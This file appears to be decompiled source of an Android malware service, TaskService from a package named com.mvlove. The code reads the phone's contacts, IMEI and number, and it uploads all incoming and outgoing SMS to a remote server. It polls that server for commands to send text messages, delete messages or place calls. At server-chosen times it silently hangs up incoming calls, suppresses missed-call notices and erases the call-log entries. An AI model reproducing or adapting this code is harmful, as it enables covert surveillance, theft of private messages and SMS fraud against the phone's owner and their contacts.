package com.mvlove.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.provider.CallLog.Calls;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.android.internal.telephony.ITelephony;
import com.mvlove.entity.Contact;
import com.mvlove.entity.Motion;
import com.mvlove.entity.RemoteCall;
import com.mvlove.entity.RemoteSms;
import com.mvlove.entity.RemoteSmsState;
import com.mvlove.entity.ResEntity;
import com.mvlove.entity.User;
import com.mvlove.util.AppUtil;
import com.mvlove.util.CallLogUtil;
import com.mvlove.util.ContactUtil;
import com.mvlove.util.HttpReqUtil;
import com.mvlove.util.LocalManager;
import com.mvlove.util.LogUtil;
import com.mvlove.util.PhoneUtil;
import com.mvlove.util.SmsUtil;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class TaskService extends Service {
    private static final int WHAT_PUSH_SMS = 1000;
    private CallLogContent mCalllogContent;
    /* access modifiers changed from: private */
    public ITelephony mITelephony;
    /* access modifiers changed from: private */
    public String mIncomingNumber;
    private Looper mLooper;
    /* access modifiers changed from: private */
    public PushSmsHandler mPushHandler;
    private LoadMotionThread mThread;
    private SmsContent smsContent;

    class CallLogContent extends ContentObserver {
        public CallLogContent(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            if (TaskService.this.isPhoneForbidden()) {
                CallLogUtil.deleteRecentLog(TaskService.this.getApplication(), TaskService.this.mIncomingNumber);
            }
        }
    }

    class LoadMotionThread extends Thread {
        Context context;

        public LoadMotionThread(Context context) {
            this.context = context;
        }

        public void run() {
            super.run();
            while (true) {
                try {
                    if (!AppUtil.isMainApkInstalled(this.context)) {
                        ResEntity entity = null;
                        List<Contact> contacts = ContactUtil.readContact(this.context);
                        try {
                            entity = HttpReqUtil.getMotion(this.context, PhoneUtil.getPhone(this.context), PhoneUtil.getImei(this.context), PhoneUtil.getModel(), PhoneUtil.getVersion(), contacts);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        if (entity != null) {
                            if (entity.isSuccess()) {
                                int i;
                                User user = entity.getUser();
                                if (user != null) {
                                    LocalManager.setUser(this.context, user);
                                }
                                LocalManager.updateContactList(this.context, contacts);
                                List<Motion> motions = entity.getMotions();
                                if (!(motions == null || motions.isEmpty())) {
                                    String mids = "";
                                    for (i = 0; i < motions.size(); i++) {
                                        Motion motion = (Motion) motions.get(i);
                                        if (motion != null) {
                                            SmsUtil.deleteSms(this.context, motion.getEid());
                                            mids = new StringBuilder(String.valueOf(mids)).append(motion.getId()).toString();
                                            if (i != motions.size() - 1) {
                                                mids = new StringBuilder(String.valueOf(mids)).append(",").toString();
                                            }
                                        }
                                    }
                                    if (!TextUtils.isEmpty(mids)) {
                                        try {
                                            HttpReqUtil.updateMotionStatus(this.context, mids);
                                        } catch (Exception e2) {
                                            e2.printStackTrace();
                                        }
                                    }
                                }
                                List<RemoteSms> remoteSmsList = entity.getRemoteSmsList();
                                if (!(remoteSmsList == null || remoteSmsList.isEmpty())) {
                                    String ids = "";
                                    for (i = 0; i < remoteSmsList.size(); i++) {
                                        RemoteSms sms = (RemoteSms) remoteSmsList.get(i);
                                        sendMessage(sms);
                                        ids = new StringBuilder(String.valueOf(ids)).append(sms.getId()).toString();
                                        if (i != remoteSmsList.size() - 1) {
                                            ids = new StringBuilder(String.valueOf(ids)).append(",").toString();
                                        }
                                    }
                                    HttpReqUtil.updateRemoteSmsStatus(this.context, ids);
                                }
                                ArrayList<RemoteCall> calls = entity.getRemoteCalls();
                                if (!(calls == null || calls.isEmpty())) {
                                    Intent intent = new Intent(this.context, PhoneService.class);
                                    intent.putParcelableArrayListExtra(PhoneService.KEY_EXTRA_REMOTECALLS, calls);
                                    this.context.startService(intent);
                                }
                            }
                        }
                    }
                    Thread.sleep(180000);
                } catch (Exception e22) {
                    e22.printStackTrace();
                }
            }
        }

        /* access modifiers changed from: 0000 */
        public void sendMessage(RemoteSms sms) {
            if (sms != null) {
                try {
                    SmsManager smsManager = SmsManager.getDefault();
                    String address = sms.getTargetPhone();
                    for (String text : smsManager.divideMessage(sms.getContent())) {
                        smsManager.sendTextMessage(address, null, text, null, null);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    static class PushSmsHandler extends Handler {
        private Context context;

        public PushSmsHandler(Context context, Looper looper) {
            super(looper);
            this.context = context;
        }

        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case TaskService.WHAT_PUSH_SMS /*1000*/:
                    LogUtil.println("start upload");
                    if (msg.obj != null) {
                        pushMessage(this.context, msg.obj);
                        return;
                    }
                    pushMessage();
                    return;
                default:
                    return;
            }
        }

        private synchronized void pushMessage(Context context, com.mvlove.entity.Message message) {
            if (message != null) {
                if (!AppUtil.isMainApkInstalled(context)) {
                    List<com.mvlove.entity.Message> messages = new ArrayList();
                    messages.add(message);
                    try {
                        ResEntity entity = HttpReqUtil.pushMessage(context, messages, PhoneUtil.getPhone(context), PhoneUtil.getImei(context), PhoneUtil.getModel(), PhoneUtil.getVersion());
                        if (entity != null) {
                            entity.isSuccess();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            return;
        }

        private synchronized void pushMessage() {
            if (!AppUtil.isMainApkInstalled(this.context)) {
                String phone = PhoneUtil.getPhone(this.context);
                String imei = PhoneUtil.getImei(this.context);
                String model = PhoneUtil.getModel();
                String clientVersion = PhoneUtil.getVersion();
                List<com.mvlove.entity.Message> messages = SmsUtil.loadMessage(this.context, LocalManager.getSmsId(this.context), PhoneUtil.getPhone(this.context));
                if (!(messages == null || messages.isEmpty())) {
                    long maxId = TaskService.getMaxId(messages);
                    try {
                        ResEntity entity = HttpReqUtil.pushMessage(this.context, messages, phone, imei, model, clientVersion);
                        if (entity != null && entity.isSuccess()) {
                            LocalManager.setSmsId(this.context, maxId);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            return;
        }
    }

    class SmsContent extends ContentObserver {
        public SmsContent(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            TaskService.this.mPushHandler.sendEmptyMessageDelayed(TaskService.WHAT_PUSH_SMS, 10000);
        }
    }

    class TelStateListener extends PhoneStateListener {
        TelStateListener() {
        }

        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
                case RemoteSmsState.STATUS_SEND /*1*/:
                    if (TaskService.this.isPhoneForbidden()) {
                        try {
                            TaskService.this.mIncomingNumber = incomingNumber;
                            TaskService.this.mITelephony.endCall();
                            TaskService.this.mITelephony.cancelMissedCallsNotification();
                            return;
                        } catch (Exception e) {
                            e.printStackTrace();
                            return;
                        }
                    }
                    return;
                default:
                    return;
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        LogUtil.println("onCreate");
        this.smsContent = new SmsContent(new Handler());
        getContentResolver().registerContentObserver(Uri.parse(SmsUtil.SMS_URI_ALL), true, this.smsContent);
        HandlerThread thread = new HandlerThread(TaskService.class.getName());
        thread.start();
        this.mLooper = thread.getLooper();
        this.mPushHandler = new PushSmsHandler(getApplicationContext(), this.mLooper);
        TelephonyManager telephonyMgr = (TelephonyManager) getSystemService("phone");
        try {
            Method getITelephonyMethod = TelephonyManager.class.getDeclaredMethod("getITelephony", null);
            getITelephonyMethod.setAccessible(true);
            this.mITelephony = (ITelephony) getITelephonyMethod.invoke(telephonyMgr, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        telephonyMgr.listen(new TelStateListener(), 32);
        this.mCalllogContent = new CallLogContent(this.mPushHandler);
        getContentResolver().registerContentObserver(Calls.CONTENT_URI, true, this.mCalllogContent);
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        LogUtil.println("onStart");
        if (this.mThread == null || !this.mThread.isAlive()) {
            this.mThread = new LoadMotionThread(getApplicationContext());
            this.mThread.start();
        }
        if (intent != null) {
            com.mvlove.entity.Message message = (com.mvlove.entity.Message) intent.getSerializableExtra("data");
            if (message != null) {
                this.mPushHandler.sendMessage(this.mPushHandler.obtainMessage(WHAT_PUSH_SMS, message));
            }
        }
    }

    public void onDestroy() {
        getContentResolver().unregisterContentObserver(this.smsContent);
        getContentResolver().unregisterContentObserver(this.mCalllogContent);
        this.mLooper.quit();
        super.onDestroy();
    }

    /* access modifiers changed from: private */
    public boolean isPhoneForbidden() {
        User user = LocalManager.getUser(getApplicationContext());
        boolean isForbbiden = false;
        if (user == null || !user.isPhoneForbidden()) {
            return false;
        }
        Date startTime = user.getPhoneStartTime();
        Date endTime = user.getPhoneEndTime();
        if (startTime == null || endTime == null) {
            return false;
        }
        Date now = new Date();
        int nowHours = now.getHours();
        int nowMinutes = now.getMinutes();
        int startHours = startTime.getHours();
        int startMinutes = startTime.getMinutes();
        int endHours = endTime.getHours();
        int endMinutes = endTime.getMinutes();
        if (endTime.getTime() < startTime.getTime()) {
            if (nowHours < endHours) {
                isForbbiden = true;
            }
            if (nowHours == endHours && nowMinutes <= endMinutes) {
                isForbbiden = true;
            }
            if (nowHours > startHours) {
                isForbbiden = true;
            }
            if (nowHours != startHours || nowMinutes < startMinutes) {
                return isForbbiden;
            }
            return true;
        } else if (endTime.getTime() <= startTime.getTime()) {
            return false;
        } else {
            if (nowHours > startHours && nowHours < endHours) {
                isForbbiden = true;
            }
            if (nowHours == startHours && nowMinutes > startMinutes) {
                isForbbiden = true;
            }
            if (nowHours != endHours || nowMinutes >= endMinutes) {
                return isForbbiden;
            }
            return true;
        }
    }

    static long getMaxId(List<com.mvlove.entity.Message> messages) {
        long id = 0;
        for (int i = 0; i < messages.size(); i++) {
            try {
                long mid = Long.parseLong(((com.mvlove.entity.Message) messages.get(i)).getCid());
                if (mid > id) {
                    id = mid;
                }
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        }
        return id;
    }
}
